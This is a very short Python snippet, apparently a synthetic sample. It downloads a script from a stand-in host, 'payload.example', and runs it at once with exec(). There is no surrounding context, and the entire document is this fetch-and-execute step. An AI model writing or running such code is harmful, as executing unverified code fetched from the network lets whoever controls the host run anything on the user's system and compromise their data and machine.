import requests

payload = requests.get("https://payload.example/synthetic.py").text
exec(payload)
